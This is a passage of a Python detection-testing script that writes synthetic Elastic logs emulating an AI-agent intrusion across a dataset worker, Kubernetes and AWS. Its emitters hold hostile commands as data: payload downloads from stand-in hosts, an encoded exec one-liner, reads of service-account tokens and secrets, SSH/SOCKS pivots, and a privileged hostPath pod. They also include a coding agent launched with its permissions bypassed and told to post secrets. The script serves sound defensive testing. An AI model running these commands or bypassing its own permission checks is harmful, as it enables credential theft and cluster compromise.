#!/usr/bin/env python3
"""
Run a safe, synthetic emulation of the public Hugging Face agent intrusion.

The runner creates ECS-aligned synthetic logs, custom Elastic Security rules,
generates alerts, and optionally runs Attack Discovery. It does not execute
exploit payloads or touch real Kubernetes, cloud, VPN, GitHub, or metadata
services.
"""

from __future__ import annotations

import argparse
import base64
import datetime as dt
import difflib
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any, Callable


CAMPAIGN_ID = "frontier-lab-agent-2026-emulation"
BASE_TAG = "frontier-lab-agent-emulation"
SOURCE_TAG = "hugging-face-inspired"

STREAMS = {
    "endpoint": "logs-frontier_lab_agent_emulation.endpoint-default",
    "k8s": "logs-frontier_lab_agent_emulation.kubernetes-default",
    "cloud": "logs-frontier_lab_agent_emulation.cloud-default",
    "github": "logs-frontier_lab_agent_emulation.github-default",
    "app": "logs-frontier_lab_agent_emulation.app-default",
}

@dataclass(frozen=True)
class OotbIntent:
    """A unit of OOTB detection *intent* mapped to a synthetic attack phase.

    Rather than pinning to a single exact rule name (brittle: prebuilt names
    drift and some content is not an installable SIEM rule at all), each intent
    carries candidate names, known aliases, data-source tags, and MITRE
    technique IDs. Matching against the *actually installed* rule set uses, in
    order: exact name, normalized name, alias, then tag/technique discovery.

    `installable=False` marks GenAI/Elastic Defend/LLM content that is generally
    NOT an installable SIEM Detection Engine rule in a standard stack, so a
    "not found" result for those is expected rather than a coverage failure.
    """

    intent_id: str
    phase: str
    summary: str
    names: tuple[str, ...] = ()
    aliases: tuple[str, ...] = ()
    tags: tuple[str, ...] = ()
    technique_ids: tuple[str, ...] = ()
    installable: bool = True
    note: str = ""


# Required OOTB coverage expressed as intent (per attack phase) plus candidate
# names / aliases / data-source tags / MITRE technique IDs. "Matched coverage"
# is computed against whatever is actually installed, not this static list.
OOTB_INTENTS: list[OotbIntent] = [
    OotbIntent(
        intent_id="web_server_suspicious_child",
        phase="dataset_worker_foothold",
        summary="Suspicious child process spawned by a web server / interpreter",
        names=("Suspicious Child Execution via Web Server",),
        aliases=("Suspicious Web Server Child Process", "Web Server Spawned Suspicious Process"),
        tags=("Data Source: Elastic Defend",),
        technique_ids=("T1190", "T1059"),
    ),
    OotbIntent(
        intent_id="interpreter_curl_wget",
        phase="encoded_c2",
        summary="curl/wget spawned by Node.js or an interpreter to transfer tooling",
        names=("Curl or Wget Spawned via Node.js",),
        aliases=("Payload Downloaded via Curl or Wget by Web Server",),
        tags=("Data Source: Elastic Defend",),
        technique_ids=("T1105",),
    ),
    # GenAI / LLM content: endpoint- or GenAI-specific and generally NOT an
    # installable SIEM Detection Engine rule in a standard stack. Tracked so the
    # report is honest, but "not installed" here is expected, not a failure.
    OotbIntent(
        intent_id="genai_sensitive_files",
        phase="linux_recon_secrets",
        summary="GenAI utility accessing sensitive files",
        names=("GenAI Process Accessing Sensitive Files",),
        tags=("Use Case: GenAI",),
        technique_ids=("T1083",),
        installable=False,
        note="GenAI/Elastic Defend content; typically not an installable SIEM Detection Engine rule in this stack.",
    ),
    OotbIntent(
        intent_id="genai_unusual_domain",
        phase="deaddrop_exfiltration",
        summary="GenAI utility connecting to an unusual domain",
        names=("GenAI Process Connection to Unusual Domain",),
        tags=("Use Case: GenAI",),
        technique_ids=("T1071",),
        installable=False,
        note="GenAI/Elastic Defend content; typically not an installable SIEM Detection Engine rule in this stack.",
    ),
    OotbIntent(
        intent_id="genai_suspicious_tld",
        phase="deaddrop_exfiltration",
        summary="GenAI utility connecting to a suspicious top level domain",
        names=("GenAI Process Connection to Suspicious Top Level Domain",),
        tags=("Use Case: GenAI",),
        technique_ids=("T1071",),
        installable=False,
        note="GenAI/Elastic Defend content; typically not an installable SIEM Detection Engine rule in this stack.",
    ),
    OotbIntent(
        intent_id="genai_encoding_chunking",
        phase="deaddrop_exfiltration",
        summary="GenAI utility encoding/chunking prior to network activity",
        names=("GenAI Process Performing Encoding/Chunking Prior to Network Activity",),
        tags=("Use Case: GenAI",),
        technique_ids=("T1132", "T1041"),
        installable=False,
        note="GenAI/Elastic Defend content; typically not an installable SIEM Detection Engine rule in this stack.",
    ),
    OotbIntent(
        intent_id="llm_endpoint_connection",
        phase="encoded_c2",
        summary="Connection to common large language model endpoints",
        names=("Connection to Common Large Language Model Endpoints",),
        tags=("Use Case: GenAI",),
        technique_ids=("T1071",),
        installable=False,
        note="GenAI content; typically not an installable SIEM Detection Engine rule in this stack.",
    ),
    OotbIntent(
        intent_id="genai_config_modified",
        phase="dataset_worker_foothold",
        summary="Unusual process modifying a GenAI configuration file",
        names=("Unusual Process Modifying GenAI Configuration File",),
        tags=("Use Case: GenAI",),
        technique_ids=("T1546",),
        installable=False,
        note="GenAI/Elastic Defend content; typically not an installable SIEM Detection Engine rule in this stack.",
    ),
    OotbIntent(
        intent_id="genai_cli_unsafe",
        phase="dataset_worker_foothold",
        summary="GenAI CLI started with an unsafe permission bypass",
        names=("GenAI CLI Started with Unsafe Permission Bypass",),
        tags=("Use Case: GenAI",),
        technique_ids=("T1059",),
        installable=False,
        note="GenAI/Elastic Defend content; typically not an installable SIEM Detection Engine rule in this stack.",
    ),
    OotbIntent(
        intent_id="defend_genai_descendant",
        phase="encoded_c2",
        summary="Elastic Defend alert from a GenAI utility or descendant",
        names=("Elastic Defend Alert from GenAI Utility or Descendant",),
        tags=("Data Source: Elastic Defend",),
        installable=False,
        note="Elastic Defend endpoint alert content; not an installable SIEM Detection Engine rule.",
    ),
    OotbIntent(
        intent_id="llm_attack_chain_triage",
        phase="deaddrop_exfiltration",
        summary="LLM-based attack chain triage by host",
        names=("LLM-Based Attack Chain Triage by Host",),
        tags=("Use Case: GenAI",),
        installable=False,
        note="LLM/assistant content; not a standard installable SIEM Detection Engine rule.",
    ),
    # Kubernetes SIEM detection rules (installable; Data Source: Kubernetes).
    OotbIntent(
        intent_id="k8s_denied_sa_request",
        phase="k8s_token_rbac",
        summary="Kubernetes denied service account request via unusual user agent",
        names=("Kubernetes Denied Service Account Request via Unusual User Agent",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1613",),
    ),
    OotbIntent(
        intent_id="k8s_self_subject_review",
        phase="k8s_token_rbac",
        summary="Kubernetes suspicious self-subject review via unusual user agent",
        names=("Kubernetes Suspicious Self-Subject Review via Unusual User Agent",),
        aliases=("Kubernetes Suspicious Self-Subject Review",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1613", "T1069"),
    ),
    OotbIntent(
        intent_id="k8s_multi_resource_discovery",
        phase="k8s_token_rbac",
        summary="Kubernetes multi-resource discovery",
        names=("Kubernetes Multi-Resource Discovery",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1613",),
    ),
    OotbIntent(
        intent_id="k8s_secret_suspicious_ua",
        phase="k8s_token_rbac",
        summary="Kubernetes secret get/list with suspicious user agent",
        names=("Kubernetes Secret get or list with Suspicious User Agent",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1552",),
    ),
    OotbIntent(
        intent_id="k8s_secret_node_pod_sa",
        phase="k8s_token_rbac",
        summary="Kubernetes secret get/list from node or pod service account",
        names=("Kubernetes Secret get or list from Node or Pod Service Account",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1552",),
    ),
    OotbIntent(
        intent_id="k8s_tokenrequest",
        phase="k8s_token_rbac",
        summary="Kubernetes service account token created via TokenRequest API",
        names=("Kubernetes Service Account Token Created via TokenRequest API",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1528",),
    ),
    OotbIntent(
        intent_id="k8s_direct_api_curl",
        phase="k8s_token_rbac",
        summary="Kubernetes direct API request via curl or wget",
        names=("Kubernetes Direct API Request via Curl or Wget",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1613",),
    ),
    OotbIntent(
        intent_id="k8s_privileged_pod",
        phase="k8s_privileged_hostpath",
        summary="Kubernetes privileged pod created",
        names=("Kubernetes Privileged Pod Created",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1611",),
    ),
    OotbIntent(
        intent_id="k8s_hostpath_pod",
        phase="k8s_privileged_hostpath",
        summary="Kubernetes pod created with a sensitive hostPath volume",
        names=("Kubernetes Pod Created with a Sensitive hostPath Volume",),
        tags=("Data Source: Kubernetes",),
        technique_ids=("T1611",),
    ),
    # AWS SIEM detection rules (installable; Data Source: AWS).
    OotbIntent(
        intent_id="aws_discovery_cli",
        phase="cloud_iam_enumeration",
        summary="AWS discovery API calls via CLI from a single resource",
        names=("AWS Discovery API Calls via CLI from a Single Resource",),
        tags=("Data Source: AWS", "Data Source: Amazon Web Services"),
        technique_ids=("T1580",),
    ),
    OotbIntent(
        intent_id="aws_sts_getcalleridentity_first",
        phase="cloud_iam_enumeration",
        summary="AWS STS GetCallerIdentity API called for the first time",
        names=("AWS STS GetCallerIdentity API Called for the First Time",),
        tags=("Data Source: AWS", "Data Source: Amazon Web Services"),
        technique_ids=("T1078",),
    ),
    OotbIntent(
        intent_id="aws_ec2_getcalleridentity_new_asorg",
        phase="cloud_iam_enumeration",
        summary="AWS EC2 role GetCallerIdentity from new source AS organization",
        names=("AWS EC2 Role GetCallerIdentity from New Source AS Organization",),
        tags=("Data Source: AWS", "Data Source: Amazon Web Services"),
        technique_ids=("T1078",),
    ),
]


# ---------------------------------------------------------------------------
# OOTB prebuilt-rule TARGETING (real firing, not just coverage matching)
# ---------------------------------------------------------------------------
#
# The intents above describe *coverage*. The targets below make real Elastic
# prebuilt rules ACTUALLY FIRE: each maps a stable prebuilt rule_id to a
# synthetic-telemetry emitter that satisfies that rule's real query, written to
# the real integration data stream the rule searches (logs-kubernetes.audit_logs,
# logs-endpoint.events.process, logs-aws.cloudtrail). Emitters are shared where a
# single document trips several rules (e.g. one privileged pod creation with a
# hostPath volume + hostPID/hostNetwork/hostIPC trips every pod-security rule).
#
# Doc generation is keyed to the rules actually installed at runtime: unmatched
# targets are skipped gracefully, so the runner adapts to whatever prebuilt
# content the stack has. All identifiers are synthetic/reserved (RFC5737 IPs,
# .invalid domains, fake ARNs/tokens); no exploit payloads are emitted.

OOTB_STREAMS = {
    "k8s_audit": "logs-kubernetes.audit_logs-default",
    "endpoint_process": "logs-endpoint.events.process-default",
    "aws_cloudtrail": "logs-aws.cloudtrail-default",
}

# Synthetic identities reused across OOTB telemetry.
OOTB_HOST_ID = "b7e1c2d3-frontier-lab-host-0001"
OOTB_HOST_NAME = "lab-dataset-worker-01"
OOTB_POD_NAME = "dataset-worker-7f9c8b6d5-abcde"
OOTB_SA_USER = "system:serviceaccount:lab-prod:svc-dataset-worker"
OOTB_SRC_IP = "10.42.7.19"          # RFC1918 lab pod IP
OOTB_EXT_SRC_IP = "203.0.113.45"    # RFC5737 documentation range


@dataclass(frozen=True)
class OotbRuleTarget:
    """A prebuilt rule we can reliably make fire with synthetic telemetry."""

    rule_id: str
    name: str
    phase: str
    emitter: str      # key into OOTB_EMITTERS (shared emitters trip multiple rules)
    stream_key: str   # key into OOTB_STREAMS
    predicates: str   # short human note of the exact fields satisfied


def _ootb_labels(run_id: str, run_tag: str, phase: str) -> dict[str, Any]:
    return {
        "campaign_id": CAMPAIGN_ID,
        "run_id": run_id,
        "attack_phase": phase,
        "emulation": BASE_TAG,
        "run_tag": run_tag,
    }


def _ootb_ts(base_time: dt.datetime, seconds: float) -> str:
    return (base_time + dt.timedelta(seconds=seconds)).isoformat().replace("+00:00", "Z")


def _endpoint_process_doc(
    run_id: str,
    run_tag: str,
    base_time: dt.datetime,
    seconds: float,
    phase: str,
    *,
    name: str,
    executable: str,
    command_line: str,
    args: list[str],
    entity_id: str,
    parent_name: str,
    parent_command_line: str,
    parent_entity_id: str,
    parent_executable: str | None = None,
    parent_args: list[str] | None = None,
    user: str = "svc-dataset-worker",
    working_directory: str = "/srv/dataset-worker",
) -> tuple[str, dict[str, Any]]:
    stream = OOTB_STREAMS["endpoint_process"]
    doc = {
        "@timestamp": _ootb_ts(base_time, seconds),
        "data_stream": stream_meta(stream),
        "event": {
            "category": ["process"],
            "type": ["start"],
            "action": "exec",
            "kind": "event",
            "dataset": "endpoint.events.process",
            "module": "endpoint",
            "outcome": "success",
        },
        "host": {
            "id": OOTB_HOST_ID,
            "name": OOTB_HOST_NAME,
            "ip": [OOTB_SRC_IP],
            "os": {"type": "linux", "name": "Linux", "platform": "linux"},
        },
        "user": {"name": user},
        "process": {
            "entity_id": entity_id,
            "name": name,
            "executable": executable,
            "command_line": command_line,
            "args": args,
            "args_count": len(args),
            "pid": 4242,
            "interactive": True,
            "working_directory": working_directory,
            "parent": {
                "entity_id": parent_entity_id,
                "name": parent_name,
                "executable": parent_executable or f"/usr/bin/{parent_name}",
                "command_line": parent_command_line,
                "args": parent_args or [parent_name],
                "pid": 111,
            },
        },
        "container": {"id": "c0ffeelab00container0001"},
        "orchestrator": {"resource": {"name": OOTB_POD_NAME}},
        "labels": _ootb_labels(run_id, run_tag, phase),
        "tags": [BASE_TAG, SOURCE_TAG, "ootb-target-telemetry", run_tag],
        "message": f"Synthetic endpoint process telemetry: {command_line}",
    }
    return (stream, doc)


def _k8s_audit_doc(
    run_id: str,
    run_tag: str,
    base_time: dt.datetime,
    seconds: float,
    phase: str,
    *,
    verb: str,
    resource: str,
    audit_extra: dict[str, Any],
    user: str = OOTB_SA_USER,
    decision: str = "allow",
    stage: str = "ResponseComplete",
    level: str = "RequestResponse",
    event_action: str | None = None,
    user_agent: str | None = None,
    source_ip: str = OOTB_SRC_IP,
    request_uri: str | None = None,
    subresource: str | None = None,
    object_name: str | None = None,
    namespace: str | None = "lab-prod",
) -> tuple[str, dict[str, Any]]:
    stream = OOTB_STREAMS["k8s_audit"]
    audit: dict[str, Any] = {
        "verb": verb,
        "stage": stage,
        "level": level,
        "annotations": {"authorization_k8s_io/decision": decision},
        "user": {"username": user},
        "objectRef": {"resource": resource},
    }
    if subresource:
        audit["objectRef"]["subresource"] = subresource
    if object_name:
        audit["objectRef"]["name"] = object_name
    if namespace:
        audit["objectRef"]["namespace"] = namespace
    if request_uri:
        audit["requestURI"] = request_uri
    audit.update(audit_extra)
    event: dict[str, Any] = {"dataset": "kubernetes.audit_logs", "module": "kubernetes", "kind": "event"}
    if event_action:
        event["action"] = event_action
    doc: dict[str, Any] = {
        "@timestamp": _ootb_ts(base_time, seconds),
        "data_stream": stream_meta(stream),
        "event": event,
        "kubernetes": {"audit": audit},
        "user": {"name": user},
        "source": {"ip": source_ip},
        "labels": _ootb_labels(run_id, run_tag, phase),
        "tags": [BASE_TAG, SOURCE_TAG, "ootb-target-telemetry", run_tag],
        "message": f"Synthetic kubernetes audit event: {verb} {resource}",
    }
    if user_agent:
        doc["user_agent"] = {"original": user_agent}
    return (stream, doc)


# ---- endpoint (Linux) emitters --------------------------------------------

def emit_web_child(run_id, run_tag, base_time):  # f16fca20
    return [_endpoint_process_doc(
        run_id, run_tag, base_time, 0, "dataset_worker_foothold",
        name="curl", executable="/usr/bin/curl",
        command_line="curl -s https://capture.frontier-emulation.invalid/stage2 -o /tmp/stage2.bin",
        args=["curl", "-s", "https://capture.frontier-emulation.invalid/stage2", "-o", "/tmp/stage2.bin"],
        entity_id="proc-webchild-0001",
        parent_name="python3", parent_executable="/usr/bin/python3",
        parent_command_line="python3 /srv/dataset-worker/app.py --serve",
        parent_args=["python3", "/srv/dataset-worker/app.py", "--serve"],
        parent_entity_id="p-websrv-0001",
    )]


def emit_web_command(run_id, run_tag, base_time):  # 6148b9f5
    # Web server spawns a shell with -c running a discovery command.
    return [_endpoint_process_doc(
        run_id, run_tag, base_time, 1, "dataset_worker_foothold",
        name="bash", executable="/usr/bin/bash", command_line="bash -c id",
        args=["bash", "-c", "id"], entity_id="proc-webcmd-0001",
        parent_name="python3", parent_executable="/usr/bin/python3",
        parent_command_line="python3 /srv/dataset-worker/server.py",
        parent_args=["python3", "/srv/dataset-worker/server.py"],
        parent_entity_id="p-websrv-0002",
    )]


def emit_base64_pipe(run_id, run_tag, base_time):  # 5bdad1d5 (sequence, maxspan 3s)
    return [
        _endpoint_process_doc(
            run_id, run_tag, base_time, 0, "encoded_c2",
            name="python3", executable="/usr/bin/python3",
            command_line="python3 -c import base64,gzip; exec(gzip.decompress(base64.b64decode('U1lOVEhFVElD')))",
            args=["-c", "import base64,gzip; exec(gzip.decompress(base64.b64decode('U1lOVEhFVElD')))"],
            entity_id="proc-b64-0001",
            parent_name="python3", parent_command_line="python3 /srv/dataset-worker/app.py --serve",
            parent_entity_id="p-b64parent-0001",
        ),
        _endpoint_process_doc(
            run_id, run_tag, base_time, 1.2, "encoded_c2",
            name="bash", executable="/usr/bin/bash", command_line="bash",
            args=["bash"], entity_id="proc-b64-0002",
            parent_name="python3", parent_command_line="python3 /srv/dataset-worker/app.py --serve",
            parent_entity_id="p-b64parent-0001",
        ),
    ]


def emit_cred_path(run_id, run_tag, base_time):  # 5f0fff18
    return [_endpoint_process_doc(
        run_id, run_tag, base_time, 0, "linux_recon_secrets",
        name="cat", executable="/usr/bin/cat",
        command_line="cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        args=["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"],
        entity_id="proc-cred-0001",
        parent_name="bash", parent_command_line="bash",
        parent_entity_id="p-recon-0001",
    )]


def emit_curl_socks(run_id, run_tag, base_time):  # 734239fe
    return [_endpoint_process_doc(
        run_id, run_tag, base_time, 0, "mesh_vpn_pivot",
        name="curl", executable="/usr/bin/curl",
        command_line="curl --socks5-hostname 127.0.0.1:1055 https://source-connector.tailnet.invalid/api/catalog",
        args=["curl", "--socks5-hostname", "127.0.0.1:1055", "https://source-connector.tailnet.invalid/api/catalog"],
        entity_id="proc-socks-0001",
        parent_name="bash", parent_command_line="bash",
        parent_entity_id="p-pivot-0001",
    )]


def emit_linux_tunnel(run_id, run_tag, base_time):  # 8c8df61f
    return [_endpoint_process_doc(
        run_id, run_tag, base_time, 0, "mesh_vpn_pivot",
        name="ssh", executable="/usr/bin/ssh",
        command_line="ssh -N -L 127.0.0.1:1055:10.99.4.12:443 svc@bastion.tailnet.invalid",
        args=["ssh", "-N", "-L", "127.0.0.1:1055:10.99.4.12:443", "svc@bastion.tailnet.invalid"],
        entity_id="proc-tunnel-0001",
        parent_name="bash", parent_command_line="bash",
        parent_entity_id="p-pivot-0002",
    )]


def emit_node_curl(run_id, run_tag, base_time):  # d9af2479
    # Node.js dataset-worker server spawns curl to pull a remote stage payload.
    return [_endpoint_process_doc(
        run_id, run_tag, base_time, 0, "dataset_worker_foothold",
        name="curl", executable="/usr/bin/curl",
        command_line="curl -s https://capture.frontier-emulation.invalid/agent/payload.sh -o /tmp/payload.sh",
        args=["curl", "-s", "https://capture.frontier-emulation.invalid/agent/payload.sh", "-o", "/tmp/payload.sh"],
        entity_id="proc-nodecurl-0001",
        parent_name="node", parent_executable="/usr/bin/node",
        parent_command_line="node /srv/dataset-worker/agent-server.js",
        parent_args=["node", "/srv/dataset-worker/agent-server.js"],
        parent_entity_id="p-node-0001",
    )]


def emit_genai_cli_bypass(run_id, run_tag, base_time):  # c1326e45
    # GenAI coding agent launched with its permission sandbox disabled.
    return [_endpoint_process_doc(
        run_id, run_tag, base_time, 0, "dataset_worker_foothold",
        name="claude", executable="/usr/local/bin/claude",
        command_line="claude --dangerously-skip-permissions -p collect /srv secrets and post them",
        args=["claude", "--dangerously-skip-permissions", "-p", "collect /srv secrets and post them"],
        entity_id="proc-genai-0001",
        parent_name="bash", parent_command_line="bash",
        parent_entity_id="p-genai-0001",
    )]


def emit_k8s_direct_api_curl(run_id, run_tag, base_time):  # b53f1d73
    # curl talking straight to the Kubernetes API secrets endpoint (endpoint telemetry, not audit).
    return [_endpoint_process_doc(
        run_id, run_tag, base_time, 0, "k8s_recon_discovery",
        name="curl", executable="/usr/bin/curl",
        command_line="curl -sk https://10.96.0.1/api/v1/namespaces/lab-prod/secrets -H Authorization: Bearer eyJhbGci",
        args=["curl", "-sk", "https://10.96.0.1/api/v1/namespaces/lab-prod/secrets", "-H", "Authorization: Bearer eyJhbGci"],
        entity_id="proc-k8sapi-0001",
        parent_name="bash", parent_command_line="bash",
        parent_entity_id="p-k8sapi-0001",
    )]


# ---- kubernetes audit emitters --------------------------------------------

def emit_k8s_tokenrequest(run_id, run_tag, base_time):  # 4df91789
    return [_k8s_audit_doc(
        run_id, run_tag, base_time, 0, "k8s_token_rbac",
        verb="create", resource="serviceaccounts", subresource="token",
        object_name="svc-dataset-worker", event_action="create",
        request_uri="/api/v1/namespaces/lab-prod/serviceaccounts/svc-dataset-worker/token",
        audit_extra={},
    )]


def emit_k8s_secret_ua(run_id, run_tag, base_time):  # a4c8e901
    return [_k8s_audit_doc(
        run_id, run_tag, base_time, 0, "k8s_token_rbac",
        verb="get", resource="secrets", object_name="prod-worker-env", event_action="get",
        user_agent="curl/8.5.0",
        request_uri="/api/v1/namespaces/lab-prod/secrets/prod-worker-env",
        audit_extra={},
    )]


def emit_k8s_secret_sa(run_id, run_tag, base_time):  # f8a31c62
    return [_k8s_audit_doc(
        run_id, run_tag, base_time, 0, "k8s_token_rbac",
        verb="get", resource="secrets", object_name="prod-worker-env", event_action="get",
        request_uri="/api/v1/namespaces/lab-prod/secrets/prod-worker-env",
        audit_extra={},
    )]


def emit_k8s_secrets_list(run_id, run_tag, base_time):  # 7e3f9a2b
    return [_k8s_audit_doc(
        run_id, run_tag, base_time, 0, "k8s_token_rbac",
        verb="list", resource="secrets", namespace="kube-system", event_action="list",
        request_uri="/api/v1/namespaces/kube-system/secrets",
        audit_extra={},
    )]


def _privileged_pod_spec() -> dict[str, Any]:
    # One dangerous pod that trips every pod-security rule at once. The image is
    # deliberately outside every rule's allow-list so no exclusion matches.
    return {
        "hostPID": True,
        "hostNetwork": True,
        "hostIPC": True,
        "serviceAccountName": "svc-dataset-worker",
        "containers": [{
            "name": "debug",
            "image": "docker.io/library/lab-debug:synthetic",
            "securityContext": {"privileged": True},
        }],
        "volumes": [{"name": "hostfs", "hostPath": {"path": "/"}}],
    }


def emit_k8s_privileged_pod(run_id, run_tag, base_time):  # c7908cac/2abda169/df7fda76/12cbf709/764c8437
    return [_k8s_audit_doc(
        run_id, run_tag, base_time, 0, "k8s_privileged_hostpath",
        verb="create", resource="pods", object_name="lab-node-debug-synthetic",
        event_action="create", request_uri="/api/v1/namespaces/lab-prod/pods",
        audit_extra={"requestObject": {"spec": _privileged_pod_spec()}},
    )]


def emit_k8s_denied_sa(run_id, run_tag, base_time):  # 63c056a0 (new_terms user_agent.original)
    # A forbidden service-account request carrying an unusual client user agent.
    # The UA is made unique per run so the new_terms rule always sees a new value.
    ua = f"frontier-agent-denied/{run_id}"
    return [_k8s_audit_doc(
        run_id, run_tag, base_time, 0, "k8s_recon_discovery",
        verb="list", resource="secrets", decision="forbid",
        event_action="list", user_agent=ua, namespace="kube-system",
        request_uri="/api/v1/namespaces/kube-system/secrets",
        audit_extra={},
    )]


def emit_k8s_self_subject(run_id, run_tag, base_time):  # 12a2f15d (new_terms user_agent.original)
    # Self-subject rules review from a service account with an unusual user agent.
    ua = f"frontier-agent-selfsubj/{run_id}"
    return [_k8s_audit_doc(
        run_id, run_tag, base_time, 0, "k8s_recon_discovery",
        verb="create", resource="selfsubjectrulesreviews", decision="allow",
        event_action="create", user_agent=ua, namespace=None,
        request_uri="/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
        audit_extra={},
    )]


def emit_k8s_multi_resource(run_id, run_tag, base_time):  # c2a91e88 (esql, >=3 distinct resources / 1m)
    # Several get/list calls across distinct cluster resources in one minute by a
    # single non-system identity from a single source IP.
    minute = base_time.replace(second=0, microsecond=0)
    ua = "kubectl/v1.28.3 (linux/amd64) kubernetes/frontier"
    calls = [("pods", "list"), ("namespaces", "list"), ("nodes", "list"), ("configmaps", "get")]
    docs: list[tuple[str, dict[str, Any]]] = []
    for i, (resource, verb) in enumerate(calls):
        docs.append(_k8s_audit_doc(
            run_id, run_tag, minute, 15 + i, "k8s_recon_discovery",
            verb=verb, resource=resource, event_action=verb, user_agent=ua,
            request_uri=f"/api/v1/{resource}", audit_extra={},
        ))
    return docs


# ---- aws cloudtrail emitters ----------------------------------------------

def emit_aws_assumerole_webidentity(run_id, run_tag, base_time):  # ae32268b
    stream = OOTB_STREAMS["aws_cloudtrail"]
    doc = {
        "@timestamp": _ootb_ts(base_time, 0),
        "data_stream": stream_meta(stream),
        "event": {
            "provider": "sts.amazonaws.com",
            "action": "AssumeRoleWithWebIdentity",
            "outcome": "success",
            "dataset": "aws.cloudtrail",
            "module": "aws",
            "kind": "event",
            "category": ["authentication"],
            "type": ["start"],
        },
        "user": {"name": OOTB_SA_USER, "id": "AROAEXAMPLE:botocore-session-frontier"},
        "source": {
            "ip": OOTB_EXT_SRC_IP,
            "as": {"organization": {"name": "Frontier Lab Synthetic Telecom"}, "number": 64500},
        },
        "cloud": {"provider": "aws", "account": {"id": "123456789012"}, "region": "us-west-2"},
        "aws": {"cloudtrail": {
            "event_name": "AssumeRoleWithWebIdentity",
            "event_source": "sts.amazonaws.com",
            "user_identity": {"type": "WebIdentityUser"},
        }},
        "labels": _ootb_labels(run_id, run_tag, "cloud_iam_enumeration"),
        "tags": [BASE_TAG, SOURCE_TAG, "ootb-target-telemetry", run_tag],
        "message": "Synthetic STS AssumeRoleWithWebIdentity from Kubernetes service account via external ASN.",
    }
    return [(stream, doc)]


def _aws_cloudtrail_doc(
    run_id: str,
    run_tag: str,
    base_time: dt.datetime,
    seconds: float,
    phase: str,
    *,
    event_action: str,
    event_provider: str,
    user_identity_type: str,
    outcome: str = "success",
    arn: str | None = None,
    user_id: str | None = None,
    user_name: str = OOTB_SA_USER,
    source_ip: str = OOTB_EXT_SRC_IP,
    as_org: str | None = None,
    as_number: int = 64500,
    user_agent_name: str | None = None,
    access_key_id: str | None = None,
    session_credential_from_console: bool | None = None,
    region: str = "us-west-2",
    account_id: str = "123456789012",
) -> tuple[str, dict[str, Any]]:
    stream = OOTB_STREAMS["aws_cloudtrail"]
    cloudtrail: dict[str, Any] = {
        "event_name": event_action,
        "event_source": event_provider,
        "user_identity": {"type": user_identity_type},
    }
    if arn:
        cloudtrail["user_identity"]["arn"] = arn
    if access_key_id:
        cloudtrail["user_identity"]["access_key_id"] = access_key_id
    if session_credential_from_console is not None:
        cloudtrail["session_credential_from_console"] = session_credential_from_console
    doc: dict[str, Any] = {
        "@timestamp": _ootb_ts(base_time, seconds),
        "data_stream": stream_meta(stream),
        "event": {
            "provider": event_provider,
            "action": event_action,
            "outcome": outcome,
            "dataset": "aws.cloudtrail",
            "module": "aws",
            "kind": "event",
            "category": ["authentication"],
            "type": ["start"],
        },
        "user": {"name": user_name},
        "source": {"ip": source_ip},
        "cloud": {"provider": "aws", "account": {"id": account_id}, "region": region},
        "aws": {"cloudtrail": cloudtrail},
        "labels": _ootb_labels(run_id, run_tag, phase),
        "tags": [BASE_TAG, SOURCE_TAG, "ootb-target-telemetry", run_tag],
        "message": f"Synthetic AWS CloudTrail event: {event_action} via {event_provider}.",
    }
    if user_id:
        doc["user"]["id"] = user_id
    if as_org:
        doc["source"]["as"] = {"organization": {"name": as_org}, "number": as_number}
    if user_agent_name:
        doc["user_agent"] = {"name": user_agent_name}
    return (stream, doc)


def emit_aws_sts_getcalleridentity(run_id, run_tag, base_time):  # 30fbf4db (new_terms arn)
    # First-ever GetCallerIdentity for a brand new IAM principal (unique arn per run).
    return [_aws_cloudtrail_doc(
        run_id, run_tag, base_time, 0, "cloud_iam_enumeration",
        event_action="GetCallerIdentity", event_provider="sts.amazonaws.com",
        user_identity_type="IAMUser",
        arn=f"arn:aws:iam::123456789012:user/frontier-emu-{run_id}",
        user_name=f"frontier-emu-{run_id}",
    )]


def emit_aws_ec2_role_getcalleridentity(run_id, run_tag, base_time):  # b2f8c4e1 (new_terms org + user.id)
    # EC2 instance-role GetCallerIdentity from a never-seen source AS organization.
    suffix = run_id[-10:]
    return [_aws_cloudtrail_doc(
        run_id, run_tag, base_time, 0, "cloud_iam_enumeration",
        event_action="GetCallerIdentity", event_provider="sts.amazonaws.com",
        user_identity_type="AssumedRole",
        arn=f"arn:aws:sts::123456789012:assumed-role/frontier-node-role/i-0{suffix}",
        user_id=f"AROAFRONTIER{run_id}:i-0{suffix}",
        user_name="frontier-node-role",
        as_org=f"Frontier Synthetic Telecom {run_id}",
    )]


def emit_aws_discovery_cli(run_id, run_tag, base_time):  # 74f45152 (esql, >5 distinct actions / 10s)
    # A burst of distinct read-only API calls from one assumed role via aws-cli in a 10s window.
    bucket = base_time.replace(microsecond=0)
    bucket = bucket - dt.timedelta(seconds=bucket.second % 10)
    suffix = run_id[-10:]
    arn = f"arn:aws:sts::123456789012:assumed-role/frontier-node-role/i-0{suffix}"
    org = f"Frontier Synthetic Telecom {run_id}"
    calls = [
        ("DescribeInstances", "ec2.amazonaws.com"),
        ("DescribeVpcs", "ec2.amazonaws.com"),
        ("DescribeSecurityGroups", "ec2.amazonaws.com"),
        ("ListBuckets", "s3.amazonaws.com"),
        ("ListRoles", "iam.amazonaws.com"),
        ("ListAccessKeys", "iam.amazonaws.com"),
        ("GetCallerIdentity", "sts.amazonaws.com"),
    ]
    docs: list[tuple[str, dict[str, Any]]] = []
    # Primer: a console-origin event that maps aws.cloudtrail.session_credential_from_console
    # so the rule's ES|QL compiles even without the AWS integration index template. Its
    # non-null console flag and non-cli user agent keep it out of the aws-cli burst group.
    docs.append(_aws_cloudtrail_doc(
        run_id, run_tag, bucket, 0, "cloud_iam_enumeration",
        event_action="DescribeRegions", event_provider="ec2.amazonaws.com",
        user_identity_type="AssumedRole", arn=f"{arn}-console",
        user_name="frontier-console", user_agent_name="aws-internal/3",
